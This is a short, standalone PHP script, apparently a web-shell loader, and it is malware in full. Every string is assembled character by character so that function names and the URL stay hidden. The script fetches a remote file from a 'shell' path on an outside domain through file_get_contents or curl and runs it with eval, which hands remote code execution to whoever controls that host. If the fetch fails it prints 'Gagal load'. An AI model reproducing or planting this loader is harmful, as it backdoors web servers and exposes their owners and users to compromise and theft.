<?php

$_u = 'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' . 
              'j'.'a'.'k'.'a'.'r'.'t'.'a'.'f'.'c'.'.'.
              'c'.'o'.'m'.'/'.
              's'.'h'.'e'.'l'.'l'.'/'.
              'e'.'r'.'r'.'o'.'r'.'2'.'.'.'t'.'x'.'t';;

$_iniget = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
$_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';

$_open = call_user_func($_iniget, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
$_curl = call_user_func($_func_exists, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');

$_out = false;

if ($_open) {
    $_fget = 'f'.'i'.'l'.'e'.'_' . 'g'.'e'.'t'.'_' . 'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
    $_out = @call_user_func($_fget, $_u);
} elseif ($_curl) {
    $_ci = 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t';
    $_co = 'c'.'u'.'r'.'l'.'_' . 's'.'e'.'t'.'o'.'p'.'t';
    $_ce = 'c'.'u'.'r'.'l'.'_' . 'e'.'x'.'e'.'c';
    $_cc = 'c'.'u'.'r'.'l'.'_' . 'c'.'l'.'o'.'s'.'e';

    $_ct1 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'R'.'E'.'T'.'U'.'R'.'N'.'T'.'R'.'A'.'N'.'S'.'F'.'E'.'R';
    $_ct2 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'F'.'O'.'L'.'L'.'O'.'W'.'L'.'O'.'C'.'A'.'T'.'I'.'O'.'N';
    $_ct3 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'T'.'I'.'M'.'E'.'O'.'U'.'T';

    $_h = call_user_func($_ci, $_u);
    call_user_func($_co, $_h, constant($_ct1), true);
    call_user_func($_co, $_h, constant($_ct2), true);
    call_user_func($_co, $_h, constant($_ct3), 10);
    $_out = call_user_func($_ce, $_h);
    call_user_func($_cc, $_h);
}

if ($_out !== false) {
    $_b64 = 'b'.'a'.'s'.'e'.'6'.'4'.'_' . 'd'.'e'.'c'.'o'.'d'.'e';
    eval('?>' . call_user_func($_b64, base64_encode($_out)));
} else {
    echo 'G'.'a'.'g'.'a'.'l'.' ' . 'l'.'o'.'a'.'d';
}

?>
